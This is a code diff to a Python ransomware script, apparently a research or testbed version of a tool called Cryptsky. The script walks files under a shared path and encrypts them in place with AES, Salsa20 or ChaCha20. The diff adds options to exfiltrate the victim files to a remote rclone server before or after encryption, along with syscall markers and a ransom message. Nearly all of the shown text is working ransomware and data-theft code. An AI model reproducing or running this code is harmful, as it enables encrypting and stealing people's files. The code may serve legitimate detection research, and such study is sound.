@@ -2,11 +2,15 @@
 from Crypto.Cipher import AES,Salsa20,ChaCha20
 from Crypto.Util import Counter
 from Crypto.Util.Padding import pad,unpad
+from datetime import datetime
 import argparse
 import os
+import time
 
 import discover
 import modify
+import exfiltrate
+import sysmark
 
 # -----------------
 # GLOBAL VARIABLES
@@ -25,6 +29,9 @@ def get_parser():
     parser.add_argument('-w', '--write', help='Write method', default="O")
     parser.add_argument('-p', '--path', help='Add the path to encrypt/decrypt',
                         default='/mnt/nfs_shared')
+    parser.add_argument('-e', '--exfil', help='Exfiltrate files. 0: No Exfil, 1: After encrypt, 2: Before encrypt', default=0)
+    parser.add_argument('-r', '--remote', help='Remote exfil server', default='sftp')
+    parser.add_argument('-v', '--verbose', help='Add custom syscalls', default=0)
     return parser
 
 def main():
@@ -34,31 +41,28 @@ def main():
     algo = args['algo']
     user_mode = args['mode']
     write_mode = args['write']
+    exfil = int(args['exfil'])
+    remote = args['remote']
+    pid = int(args['verbose'])
     try:
         mode = getattr(AES, f"MODE_{user_mode.upper()}")
     except AttributeError:
         raise ValueError(f"Unsupported mode: AES {user_mode}")
+    
+    if pid > 0:
+        sysmark.invoke_syscall(pid,1)
 
     if decrypt:
-        print(f"\
-Cryptsky!\
----------------\
-Your files have been encrypted.Happy decrypting and be more careful next time!\
-\
-Your decryption key is: {HARDCODED_KEY}\
-")
-        #key = raw_input('Enter Your Key> ')
+        print(f"\Ransomed! Your files have been encrypted. Your decryption key is: {HARDCODED_KEY}")
         key = HARDCODED_KEY
-
+        encrypt_mode = 0
     else:
         # In real ransomware, this part includes complicated key generation,
         # sending the key back to attackers and more
-        # maybe I'll do that later. but for now, this will do.
         if HARDCODED_KEY:
             key = HARDCODED_KEY
-
-        # else:
-        #     key = random(32)
+        encrypt_mode = 1
+    
 
     if algo == 'AES':
         if mode in (AES.MODE_CBC, AES.MODE_CFB, AES.MODE_OFB):
@@ -78,39 +82,46 @@ Your decryption key is: {HARDCODED_KEY}\
         crypt = ChaCha20.new(key=key256, nonce=nonce)
 
     # change this to fit your needs.
+    if exfil > 0:
+        now = datetime.now()
+        pathstr = now.strftime("%Y%m%d_%H%M%S")
+        if not exfiltrate.is_able():
+            print("Rclone is not installed.")
     startdirs = [args['path']]
+
+    #phase_time_start = time.time()
+    #sleep = False
 
     for currentDir in startdirs:
         for f in discover.discoverFiles(currentDir):
             #print(f)
+            
+            # Swap between idle and active
+            #if (time.time() - phase_time_start > 5):
+            #    sleep = True
+
+            #if sleep:
+            #    time.sleep(5)
+            #    sleep = False
+            #    phase_time_start = time.time()
+
+            if exfil == 2:
+                exfiltrate.copy(f, remote, pathstr)
+
             if write_mode == 'O':
-                if decrypt:
-                    modify.modify_file_inplace(f, crypt, encrypt=0)
-                else:
-                    modify.modify_file_inplace(f, crypt, encrypt=1)
+                modify.modify_file_inplace(f, crypt, encrypt=encrypt_mode)
             elif write_mode == 'WB':
-                if decrypt:
-                    modify.modify_file_writebefore(f, crypt, encrypt=0)
-                else:
-                    modify.modify_file_writebefore(f, crypt, encrypt=1)
+                modify.modify_file_writebefore(f, crypt, encrypt=encrypt_mode)
             elif write_mode == 'WA':
-                if decrypt:
-                    modify.modify_file_writeafter(f, crypt, encrypt=0)
-                else:
-                    modify.modify_file_writeafter(f, crypt, encrypt=1)
+                modify.modify_file_writeafter(f, crypt, encrypt=encrypt_mode)
             #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
 
-    # This wipes the key out of memory
-    # to avoid recovery by third party tools
-    for _ in range(100):
-        #key = random(32)
-        pass
-
-    if not decrypt:
-        pass
-         # post encrypt stuff
-         # desktop picture
-         # icon, etc
+            if exfil == 1:
+                if write_mode == 'WB':
+                    f = f+'.crypt'
+                exfiltrate.copy(f, remote, pathstr)
+    if pid > 0:
+        sysmark.invoke_syscall(pid,1)
 
 if __name__=="__main__":
     main()
